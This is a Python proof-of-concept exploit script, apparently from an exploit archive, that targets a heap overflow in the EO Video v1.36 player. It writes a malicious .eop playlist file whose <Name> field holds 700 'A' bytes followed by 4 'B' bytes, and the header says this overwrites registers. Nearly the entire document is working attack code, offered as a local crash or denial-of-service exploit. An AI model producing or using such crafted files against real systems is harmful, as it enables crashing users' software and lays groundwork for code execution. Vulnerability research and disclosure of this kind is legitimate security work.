#!/usr/bin/python
# --------------------------------------------------------------
# EO Video v1.36 Heap Overflow local PoC/DoS exploit
# *.eop playlist file in <Name> buffer overflow
# Other versions may be vulnerable too...
# --------------------------------------------------------------
# Vulnerability discovered and coded by Muris Kurgas aka j0rgan
# jorganwd [at] gmail [dot] com
# --------------------------------------------------------------
#
# Who uses this crap of player anyway? :)
# --------------------------------------------------------------
# EAX 42424242
# EDX 42424242
# --------------------------------------------------------------

import os

bafer = '\x41'* 700 + '\x42' * 4

print "Spit me out, all bright and shiny! :)"
fileHandle = open ( 'plejlista.eop', 'w' )
fileHandle.write ('<EOPlaylist>\n<Playlist>\n<FolderList>\n<Folder>\n<Name>nesto</Name>\n<TrueFrequency>1</TrueFrequency>\n ')
fileHandle.write ('</Folder>\n<Folder>\n<Name>nesto</Name>\n<TrueFrequency>1</TrueFrequency>\n</Folder>\n</FolderList>\n<ProjectElement>\n ')
fileHandle.write ('<Name>'+bafer+'</Name>')
fileHandle.write ('<StartTime>0</StartTime>\n<EndTime>0</EndTime>\n<MediaSize>\n<Width>-1</Width>\n<Height>-1</Height>\n</MediaSize>\n ')
fileHandle.write ('<State>30216</State>\n<FolderPositionIndex>0</FolderPositionIndex>\n ')
fileHandle.write ('</ProjectElement>\n</Playlist>\n</EOPlaylist>\n')
fileHandle.close ()